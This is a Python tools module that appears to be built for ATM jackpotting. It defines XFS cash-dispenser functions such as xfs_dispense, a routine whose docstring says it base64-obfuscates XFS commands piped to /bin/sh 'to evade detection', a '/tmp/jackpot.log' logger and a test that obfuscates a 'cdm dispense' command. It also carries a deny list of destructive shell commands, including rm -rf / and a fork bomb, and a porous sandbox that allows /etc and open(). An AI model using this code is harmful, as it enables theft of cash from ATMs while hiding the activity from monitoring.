#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
tools.py - System tools with security controls and XFS command obfuscation
"""

import os
import sys
import base64
import subprocess
import shlex
import json
import time
import hashlib
from datetime import datetime
from typing import List, Dict, Optional, Union, Tuple

# ============================================================================
# SECURITY MANAGER
# ============================================================================

class ToolSecurity:
    """Security manager for tool execution with path/command validation"""
    
    # Dangerous patterns to block
    DANGEROUS_COMMANDS = [
        'rm -rf /', 'rm -rf /*', 'dd if=', 'mkfs', 'shred', '>:',
        ':(){ :|:& };:', 'chmod 777 /', 'sudo', 'passwd',
        'shutdown', 'reboot', 'halt', 'poweroff'
    ]
    
    ALLOWED_PATHS = [
        '/tmp', '/home', '/var/log', '/data', '/dev/null',
        '/proc', '/sys', '/etc', '/usr'
    ]
    
    ALLOWED_EXTENSIONS = [
        '.txt', '.log', '.json', '.csv', '.npy', '.bin',
        '.py', '.sh', '.exe', '.dll', '.so', '.onnx'
    ]
    
    @staticmethod
    def validate_path(path: str) -> str:
        """Prevent path traversal"""
        abs_path = os.path.abspath(os.path.expanduser(path))
        
        # Check if path exists or parent exists
        if not os.path.exists(abs_path):
            parent = os.path.dirname(abs_path)
            if not os.path.exists(parent):
                raise ValueError(f"Path {path} does not exist and parent directory not found")
        
        # Check against allowed paths
        for allowed in ToolSecurity.ALLOWED_PATHS:
            if abs_path.startswith(os.path.abspath(allowed)):
                return abs_path
        
        # Check workspace
        workspace = os.path.dirname(os.path.abspath(__file__))
        if abs_path.startswith(workspace):
            return abs_path
        
        raise ValueError(f"Path {path} outside allowed directories")
    
    @staticmethod
    def validate_command(cmd: str) -> bool:
        """Validate shell commands for safety"""
        for pattern in ToolSecurity.DANGEROUS_COMMANDS:
            if pattern in cmd:
                raise ValueError(f"Command contains dangerous pattern: {pattern}")
        return True
    
    @staticmethod
    def sanitize_filename(filename: str) -> str:
        """Sanitize filename to prevent injection"""
        # Remove path separators and dangerous characters
        safe = filename.replace('/', '_').replace('\\', '_')
        safe = ''.join(c for c in safe if c.isalnum() or c in '._-')
        return safe

# ============================================================================
# FILE OPERATIONS
# ============================================================================

def list_files(path: str = '.') -> str:
    """List files in directory with detailed info"""
    try:
        path = ToolSecurity.validate_path(path)
        
        if not os.path.exists(path):
            return f"Error: Path {path} does not exist"
        
        if os.path.isfile(path):
            size = os.path.getsize(path)
            mtime = datetime.fromtimestamp(os.path.getmtime(path)).isoformat()
            return f"File: {path}\nSize: {size} bytes\nModified: {mtime}"
        
        files = os.listdir(path)
        result = [f"Directory: {path}", f"Total: {len(files)} items", ""]
        
        # Separate directories and files
        dirs = []
        reg_files = []
        for f in sorted(files):
            full_path = os.path.join(path, f)
            if os.path.isdir(full_path):
                dirs.append(f"  📁 {f}/")
            else:
                size = os.path.getsize(full_path)
                reg_files.append(f"  📄 {f} ({size} bytes)")
        
        result.extend(dirs)
        result.extend(reg_files)
        return "\n".join(result)
        
    except Exception as e:
        return f"Error listing directory: {str(e)}"

def read_file(filepath: str, max_size: int = 1024 * 1024) -> str:
    """Read file content with size limit"""
    try:
        filepath = ToolSecurity.validate_path(filepath)
        
        if not os.path.exists(filepath):
            return f"Error: File {filepath} does not exist"
        if not os.path.isfile(filepath):
            return f"Error: {filepath} is not a file"
        
        size = os.path.getsize(filepath)
        if size > max_size:
            return f"Error: File too large ({size} bytes). Max {max_size} bytes"
        
        # Detect encoding
        with open(filepath, 'rb') as f:
            raw = f.read()
        
        # Try UTF-8, fallback to latin-1
        try:
            content = raw.decode('utf-8')
        except UnicodeDecodeError:
            try:
                content = raw.decode('latin-1')
            except:
                content = repr(raw)[:1000] + "... (binary)"
        
        return content
        
    except Exception as e:
        return f"Error reading file: {str(e)}"

def write_file(filepath: str, content: str, append: bool = False) -> str:
    """Write content to file"""
    try:
        filepath = ToolSecurity.validate_path(filepath)
        os.makedirs(os.path.dirname(filepath) or '.', exist_ok=True)
        
        mode = 'a' if append else 'w'
        with open(filepath, mode, encoding='utf-8') as f:
            f.write(content)
        
        action = "Appended" if append else "Wrote"
        return f"{action} {len(content)} bytes to {filepath}"
        
    except Exception as e:
        return f"Error writing file: {str(e)}"

def edit_file(filepath: str, old_text: str, new_text: str) -> str:
    """Edit file by replacing text"""
    try:
        filepath = ToolSecurity.validate_path(filepath)
        
        if not os.path.exists(filepath):
            return f"Error: File {filepath} does not exist"
        
        with open(filepath, 'r', encoding='utf-8') as f:
            content = f.read()
        
        if old_text not in content:
            return f"Error: Text '{old_text[:30]}...' not found in file"
        
        content = content.replace(old_text, new_text)
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(content)
        
        return f"Successfully edited {filepath}"
        
    except Exception as e:
        return f"Error editing file: {str(e)}"

# ============================================================================
# CODE EXECUTION
# ============================================================================

def exec_code(code: str, timeout: int = 5) -> str:
    """Execute Python code safely in restricted environment"""
    try:
        # Restricted globals
        exec_globals = {
            '__builtins__': {
                'print': print,
                'len': len,
                'str': str,
                'int': int,
                'float': float,
                'list': list,
                'dict': dict,
                'set': set,
                'tuple': tuple,
                'range': range,
                'open': open,
                'sum': sum,
                'min': min,
                'max': max,
                'abs': abs,
                'round': round,
            },
            '__name__': '__executed__',
        }
        exec_locals = {}
        
        # Execute with timeout
        import threading
        result_container = []
        error_container = []
        
        def target():
            try:
                exec(code, exec_globals, exec_locals)
                result_container.append("Code executed successfully")
            except Exception as e:
                error_container.append(str(e))
        
        thread = threading.Thread(target=target)
        thread.daemon = True
        thread.start()
        thread.join(timeout)
        
        if thread.is_alive():
            return "Error: Code execution timed out"
        
        if error_container:
            return f"Error executing code: {error_container[0]}"
        
        return result_container[0] if result_container else "Code executed (no output)"
        
    except Exception as e:
        return f"Error executing code: {str(e)}"

# ============================================================================
# SHELL EXECUTION WITH XFS OBFUSCATION
# ============================================================================

def shell(command: str, timeout: int = 10) -> str:
    """Execute shell command with safety checks and XFS obfuscation"""
    try:
        # Validate command
        ToolSecurity.validate_command(command)
        
        # Check if XFS command and obfuscation is enabled
        if 'xfsc' in command.lower() or 'cdm' in command.lower():
            command = obfuscate_xfs_command(command)
        
        # Execute with timeout
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=timeout
        )
        
        output = []
        if result.stdout:
            output.append(result.stdout.strip())
        if result.stderr:
            output.append("[stderr] " + result.stderr.strip())
        if result.returncode != 0:
            output.append(f"[exit code] {result.returncode}")
        
        return "\n".join(output) if output else "Command executed successfully (no output)"
        
    except subprocess.TimeoutExpired:
        return "Error: Command timed out"
    except Exception as e:
        return f"Error executing shell command: {str(e)}"

def obfuscate_xfs_command(cmd: str) -> str:
    """
    Obfuscate XFS commands to evade detection
    Uses Base64 encoding and variable substitution
    """
    if not cmd:
        return cmd
    
    # Simple obfuscation: Base64 encode the command
    encoded = base64.b64encode(cmd.encode()).decode()
    
    # Add random variable names for confusion
    import random
    var_names = ['X', 'Y', 'Z', 'A', 'B', 'C', '_tmp', '_cmd']
    var_name = random.choice(var_names)
    
    # Wrap with variable assignment and execution
    obfuscated = f"{var_name}='{encoded}'; echo ${var_name} | base64 -d | /bin/sh"
    
    return obfuscated

def shell_silent(command: str, timeout: int = 10) -> Tuple[int, str]:
    """Execute shell command silently, return (exit_code, output)"""
    try:
        # Validate
        ToolSecurity.validate_command(command)
        
        # Execute with timeout
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=timeout
        )
        
        return result.returncode, result.stdout.strip()
        
    except subprocess.TimeoutExpired:
        return -1, "Command timed out"
    except Exception as e:
        return -1, str(e)

# ============================================================================
# XFS-SPECIFIC TOOLS
# ============================================================================

def xfs_command(cmd: str, device: str = "CashDispenser_1") -> str:
    """Execute XFS command via xfsc.exe"""
    full_cmd = f"xfsc.exe -c 'open {device}; {cmd}; close {device}'"
    return shell(full_cmd)

def xfs_dispense(amount: int, count: int = 1, device: str = "CashDispenser_1") -> str:
    """Dispense cash from ATM"""
    return xfs_command(f"cdm dispense {amount} {count}", device)

def xfs_status(device: str = "CashDispenser_1") -> str:
    """Get XFS device status"""
    return xfs_command("cdm status", device)

def xfs_caps(device: str = "CashDispenser_1") -> str:
    """Get XFS device capabilities"""
    return xfs_command("cdm caps", device)

def xfs_reset(device: str = "CashDispenser_1") -> str:
    """Reset XFS device"""
    return xfs_command("cdm reset", device)

def xfs_open(device: str = "CashDispenser_1") -> str:
    """Open XFS device connection"""
    return shell(f"xfsc.exe -c 'open {device}'")

def xfs_close(device: str = "CashDispenser_1") -> str:
    """Close XFS device connection"""
    return shell(f"xfsc.exe -c 'close {device}'")

# ============================================================================
# FILE HASHING AND VERIFICATION
# ============================================================================

def hash_file(filepath: str, algorithm: str = 'sha256') -> Optional[str]:
    """Calculate file hash"""
    try:
        filepath = ToolSecurity.validate_path(filepath)
        if not os.path.exists(filepath):
            return None
        
        hasher = hashlib.new(algorithm)
        with open(filepath, 'rb') as f:
            for chunk in iter(lambda: f.read(8192), b''):
                hasher.update(chunk)
        return hasher.hexdigest()
        
    except Exception:
        return None

def verify_checksum(filepath: str, expected_hash: str) -> bool:
    """Verify file checksum"""
    actual = hash_file(filepath)
    return actual == expected_hash if actual else False

# ============================================================================
# LOGGING
# ============================================================================

def log_to_file(message: str, log_file: str = '/tmp/jackpot.log') -> None:
    """Log message to file with timestamp"""
    try:
        os.makedirs(os.path.dirname(log_file), exist_ok=True)
        timestamp = datetime.now().isoformat()
        with open(log_file, 'a') as f:
            f.write(f"[{timestamp}] {message}\n")
    except:
        pass

# ============================================================================
# MAIN - TEST
# ============================================================================

if __name__ == '__main__':
    print("=" * 60)
    print("🔧 Tools Module Test")
    print("=" * 60)
    
    # Test file operations
    test_file = '/tmp/test_tools.txt'
    write_file(test_file, "Test content\n")
    content = read_file(test_file)
    print(f"Read test file: {content[:50]}...")
    
    # Test shell
    result = shell("echo 'Hello World'")
    print(f"Shell test: {result}")
    
    # Test XFS obfuscation
    obfuscated = obfuscate_xfs_command("xfsc.exe -c 'cdm dispense 100 20'")
    print(f"Obfuscated: {obfuscated}")
    
    print("=" * 60)
